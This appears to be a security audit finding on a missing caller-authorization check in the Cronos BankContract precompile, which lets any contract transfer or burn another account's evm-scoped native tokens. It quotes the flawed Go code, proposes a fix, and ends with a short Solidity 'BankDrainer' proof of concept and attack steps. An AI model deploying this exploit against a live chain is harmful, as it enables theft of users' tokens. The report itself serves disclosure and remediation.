### Title
Missing Caller Authorization in `BankContract.transfer()` Precompile Allows Unauthorized Native Token Transfers - (File: x/cronos/keeper/precompiles/bank.go)

### Summary

The `BankContract` precompile's `transfer` method accepts an arbitrary `sender` address from calldata and executes `bankKeeper.SendCoins(ctx, from, to, ...)` without verifying that `contract.Caller()` equals the supplied `sender`. Any EVM contract can therefore drain another account's `evm/<callerContract>` native tokens without the owner's consent.

### Finding Description

`BankContract.Run()` handles the `transfer` method as follows:

```go
case TransferMethodName:
    sender    := args[0].(common.Address)   // attacker-controlled
    recipient := args[1].(common.Address)
    amount    := args[2].(*big.Int)
    from := sdk.AccAddress(sender.Bytes())
    to   := sdk.AccAddress(recipient.Bytes())
    // ...
    denom := EVMDenom(contract.Caller())    // evm/<callerContract>
    amt   := sdk.NewCoin(denom, ...)
    // NO check: contract.Caller() == sender
    bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
``` [1](#0-0) 

The `denom` is scoped to `contract.Caller()`, so only `evm/<callerContract>` tokens are moved. However, the `sender` (the account whose tokens are debited) is taken directly from calldata with no authorization check. The intended usage pattern, shown in `TestBank.sol`, is for the calling contract to pass `msg.sender` as the sender:

```solidity
function nativeTransfer(address recipient, uint256 amount) public returns (bool) {
    _transfer(msg.sender, recipient, amount);
    return bank.transfer(msg.sender, recipient, amount);  // caller passes msg.sender
}
``` [2](#0-1) 

But the precompile never enforces this. A malicious contract can pass any victim address as `sender`.

The same missing check exists for the `burn` case: `recipient` (the address burned from) is also caller-supplied with no authorization check against `contract.Caller()`. [3](#0-2) 

### Impact Explanation

**Critical — Unauthorized transfer/burn of precompile-controlled native assets.**

`evm/<contractAddress>` tokens are native Cosmos bank-module tokens. Users acquire them by calling `moveToNative` (or equivalent), which burns ERC20 tokens and mints the native representation. A malicious contract can:

1. Distribute `evm/<maliciousContract>` tokens to users via `bank.mint(victimAddress, amount)`.
2. Later call `bank.transfer(victimAddress, attackerAddress, amount)` to drain those tokens without any approval from the victim.
3. Alternatively call `bank.burn(victimAddress, amount)` to destroy the victim's holdings.

This matches the Critical impact class: *"Unauthorized mint, burn, transfer … or balance/accounting change for … precompile-controlled assets."*

### Likelihood Explanation

Any unprivileged EVM contract can call the bank precompile at `0x0000000000000000000000000000000000000064`. The attacker only needs to deploy a contract and call `bank.transfer(victim, attacker, amount)`. The constraint is that the victim must hold `evm/<attackerContract>` tokens, which is achievable in a DeFi scenario where the attacker first mints tokens to users. [4](#0-3) 

### Recommendation

Add a caller authorization check in the `transfer` (and `burn`) case, analogous to the `exec()` helper used by other precompiles:

```go
case TransferMethodName:
    sender := args[0].(common.Address)
    // Enforce: only the token owner (or an approved spender) may initiate a transfer
    if contract.Caller() != sender {
        return nil, errors.New("caller is not authorized to transfer on behalf of sender")
    }
    // ... rest of logic
``` [5](#0-4) 

The `exec()` utility in `utils.go` already demonstrates the correct pattern: extract the signer from the message and reject if it does not match `e.caller`.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankModule {
    function transfer(address sender, address recipient, uint256 amount) external payable returns (bool);
}

contract BankDrainer {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: attacker calls this to drain victim's evm/<address(this)> tokens
    function drain(address victim, address attacker, uint256 amount) external {
        // No approval from victim required — precompile does not check caller == sender
        bank.transfer(victim, attacker, amount);
    }
}
```

1. Attacker deploys `BankDrainer` at address `A`.
2. Attacker (or any mechanism) causes victim to hold `evm/A` native tokens (e.g., via `bank.mint(victim, amount)` called from `A`).
3. Attacker calls `BankDrainer.drain(victimAddress, attackerAddress, amount)`.
4. `bankKeeper.SendCoins` transfers `evm/A` tokens from victim to attacker with no authorization check. [6](#0-5)
